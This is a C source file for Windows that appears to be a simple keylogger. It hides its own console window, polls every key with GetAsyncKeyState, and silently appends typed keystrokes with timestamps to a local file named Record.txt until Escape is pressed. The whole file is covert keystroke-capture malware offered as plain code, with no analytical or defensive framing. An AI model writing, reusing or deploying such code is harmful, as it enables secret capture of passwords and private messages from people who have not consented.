#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <conio.h>

void hidewindow();
FILE *fp,*fn;

int main()
{
    hidewindow();
    char capture;
    time_t s;
    time(&s);

    while(1)
    {
        for(capture=0;capture<=256;capture++)
        {
        if(GetAsyncKeyState(capture)== -32767)
        {
            fp=fopen("Record.txt","a+");
            fn=fopen("Signal.txt","w");
            fprintf(fn,"\nKeylogging System halt......... !");
                fclose(fn);
            if(toascii(capture)==27)
                {
                    system("Signal.txt");
                    exit(0);
                }
            else if(toascii(capture)==13)
                {
                fprintf(fp,"\n");
                fprintf(fp,"%s\n",ctime(&s));
                }
            else if(toascii(capture)==8)
                fprintf(fp,"<");

                fprintf(fp,"%c",capture);

                fclose(fp);

        }

        }
    }

    return 0;
}

void hidewindow()
{
    HWND Stealth;
    AllocConsole();
    Stealth=FindWindowA("ConsoleWindowClass",0);
    ShowWindow(Stealth,0);

}
